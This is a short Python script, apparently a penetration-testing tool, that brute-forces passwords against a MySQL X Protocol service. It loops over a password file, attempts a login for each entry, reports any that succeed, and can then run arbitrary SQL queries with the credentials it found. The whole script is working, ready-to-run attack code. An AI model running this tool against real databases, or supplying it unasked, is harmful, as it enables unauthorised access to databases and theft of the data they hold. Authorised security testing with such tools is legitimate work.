import mysqlx
import argparse

def Brute(target,targetport,user,password,passwordfile,stop,verbose):
    with open(passwordfile, "r") as f:
        # Set passwords variable
        passwords = f.readlines()
        # For each password, try to connect with these settings
        for pwd in passwords:
            try:
                session = mysqlx.get_session({
                'host': target,
                'port': targetport,
                'user': user,
                'password': pwd.rstrip()
                })
                # Cleanup session
                session.close()
            except Exception as e:
                if verbose:
                    print("Connection failed with error:  {}".format(e))
                else:
                    continue
            else:
                print("Connection success with password: {}".format(pwd))
                if stop:
                    break
def Query(target,targetport,user,password,database,query):
    try:
        session = mysqlx.get_session({
        'host': target,
        'port': targetport,
        'user': user,
        'password': password
        })
        
        if database:
            # Switch to use our selected database
            session.sql("USE {}".format(database)).execute()
            # Execute the query
            myResult = session.sql(query).execute()
            # Fetch the results
            results = myResult.fetch_all()
            # Print the results
            for row in results:
                for col in myResult.columns:
                    print(row.get_string(col.get_column_name()))
        else:
            # If no database, just execute the query
            myResult = session.sql(query).execute()  
            # Fetch results
            results = myResult.fetch_all()
            # Print results
            for row in results:
                for col in myResult.columns:
                    print(row.get_string(col.get_column_name()))
        # Cleanup session
        session.close()
    except Exception as e:
        # Print our error for troubleshooting
        print("Connection failed with error:  {}".format(e))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, required=True)
    parser.add_argument('-p', '--port', type=int, default=33060, required=False)
    parser.add_argument('-u', '--user', type=str, required=True)
    parser.add_argument('-P', '--password', type=str, required=False)
    parser.add_argument('-f', '--passwordfile', type=str, required=False)
    parser.add_argument('-d', '--database', type=str, required=False)
    parser.add_argument('-q', '--query', type=str, required=False)
    parser.add_argument('-s', '--stoponsuccess', action='store_true', required=False)
    parser.add_argument('-v', '--verbose', action='store_true', required=False)
    args = parser.parse_args()

    if args.query:
        Query(args.target,args.port,args.user,args.password,args.database,args.query)
    else:
        Brute(args.target,args.port,args.user,args.password,args.passwordfile,args.stoponsuccess,args.verbose)